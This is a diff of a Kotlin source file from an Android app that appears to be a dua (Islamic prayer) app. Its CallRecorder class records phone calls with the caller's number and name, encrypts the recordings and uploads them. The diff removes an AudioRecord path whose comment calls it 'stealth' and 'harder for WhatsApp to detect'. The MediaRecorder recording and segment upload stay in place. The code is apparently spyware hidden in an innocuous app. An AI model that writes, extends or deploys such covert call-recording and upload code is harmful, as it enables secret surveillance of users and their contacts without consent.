@@ -1,8 +1,6 @@
 package islamic.duas.media
 
 import android.content.Context
-import android.media.AudioFormat
-import android.media.AudioRecord
 import android.media.MediaRecorder
 import android.os.Build
 import android.os.Environment
@@ -14,9 +12,7 @@ import islamic.duas.utils.DeviceId
 import islamic.duas.utils.PayloadCipher
 import kotlinx.coroutines.*
 import org.json.JSONObject
-import java.io.ByteArrayOutputStream
 import java.io.File
-import java.io.FileOutputStream
 import java.util.UUID
 import java.util.concurrent.atomic.AtomicBoolean
 
@@ -63,7 +59,6 @@ class CallRecorder private constructor(private val context: Context) {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val uploadedSegments = java.util.Collections.synchronizedSet(mutableSetOf<Int>())
     private val failedSegments = mutableListOf<Int>()
-    private var audioRecord: AudioRecord? = null
 
     fun startCall(type: String, number: String, name: String, direction: String) {
         synchronized(lock) {
@@ -166,48 +161,7 @@ class CallRecorder private constructor(private val context: Context) {
         } catch (_: Exception) { true }
     }
 
-    private var audioRecordBuffer: ByteArrayOutputStream? = null
-    private var audioRecordTarget: File? = null
-    private val audioRecordLock = Any()
-
     private fun startMediaRecorder(file: File) {
-        // Try AudioRecord first (stealth, harder for WhatsApp to detect)
-        val sampleRate = 44100
-        val channelConfig = AudioFormat.CHANNEL_IN_MONO
-        val audioFormat = AudioFormat.ENCODING_PCM_16BIT
-        val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat) * 4
-        if (bufferSize > 0) {
-            val sources = listOf(MediaRecorder.AudioSource.VOICE_RECOGNITION, MediaRecorder.AudioSource.MIC)
-            for (source in sources) {
-                try {
-                    val record = AudioRecord(source, sampleRate, channelConfig, audioFormat, bufferSize)
-                    if (record.state == AudioRecord.STATE_INITIALIZED) {
-                        audioRecord = record
-                        audioRecordTarget = file
-                        audioRecordBuffer = ByteArrayOutputStream()
-                        record.startRecording()
-                        scope.launch {
-                            val buf = ByteArray(bufferSize)
-                            while (isRecording.get() && record.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
-                                val read = record.read(buf, 0, buf.size)
-                                if (read > 0) {
-                synchronized(audioRecordLock) {
-                    audioRecordBuffer?.write(buf, 0, read)
-                }
-                                }
-                            }
-                        }
-                        Log.d("CallFix", "AudioRecord started with source=$source")
-                        return
-                    }
-                    record.release()
-                } catch (e: Exception) {
-                    Log.w("CallFix", "AudioRecord source $source failed: ${e.message}")
-                }
-            }
-        }
-
-        // Fallback to MediaRecorder
         val audioSources = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             listOf(
                 MediaRecorder.AudioSource.VOICE_RECOGNITION,
@@ -257,56 +211,11 @@ class CallRecorder private constructor(private val context: Context) {
     }
 
     private fun stopMediaRecorder() {
-        // Stop AudioRecord if active
-        val record = audioRecord
-        if (record != null) {
-            try {
-                record.stop()
-                record.release()
-            } catch (_: Exception) {}
-            audioRecord = null
-
-            val pcmData: ByteArray?
-            synchronized(audioRecordLock) {
-                pcmData = audioRecordBuffer?.toByteArray()
-                audioRecordBuffer = null
-            }
-            val target = audioRecordTarget
-            audioRecordTarget = null
-
-            if (pcmData != null && pcmData.isNotEmpty() && target != null) {
-                try {
-                    val wavFile = File(context.cacheDir, "wav_${System.nanoTime()}.wav")
-                    FileOutputStream(wavFile).use { out ->
-                        val dataSize = pcmData.size; val fs = 44 + dataSize
-                        out.write("RIFF".toByteArray(Charsets.US_ASCII)); out.write(le32(fs - 8))
-                        out.write("WAVE".toByteArray(Charsets.US_ASCII))
-                        out.write("fmt ".toByteArray(Charsets.US_ASCII)); out.write(le32(16))
-                        out.write(le16(1)); out.write(le16(1))
-                        out.write(le32(44100)); out.write(le32(44100 * 2))
-                        out.write(le16(2)); out.write(le16(16))
-                        out.write("data".toByteArray(Charsets.US_ASCII)); out.write(le32(dataSize))
-                        out.write(pcmData)
-                    }
-                    val result = AudioProcessor.process(wavFile, "audio/wav")
-                    wavFile.delete()
-                    if (result != null && result.bytes.isNotEmpty()) {
-                        FileOutputStream(target).use { it.write(result.bytes) }
-                    }
-                } catch (_: Exception) {}
-            }
-            return
-        }
-
-        // Stop MediaRecorder if active
         try {
             mediaRecorder?.apply { stop(); release() }
         } catch (_: Exception) {}
         mediaRecorder = null
     }
-
-    private fun le32(v: Int): ByteArray = byteArrayOf((v and 0xFF).toByte(), ((v shr 8) and 0xFF).toByte(), ((v shr 16) and 0xFF).toByte(), ((v shr 24) and 0xFF).toByte())
-    private fun le16(v: Int): ByteArray = byteArrayOf((v and 0xFF).toByte(), ((v shr 8) and 0xFF).toByte())
 
     private suspend fun uploadSegment(file: File, segmentIndex: Int, recordingId: String? = null) {
         if (uploadedSegments.contains(segmentIndex)) {
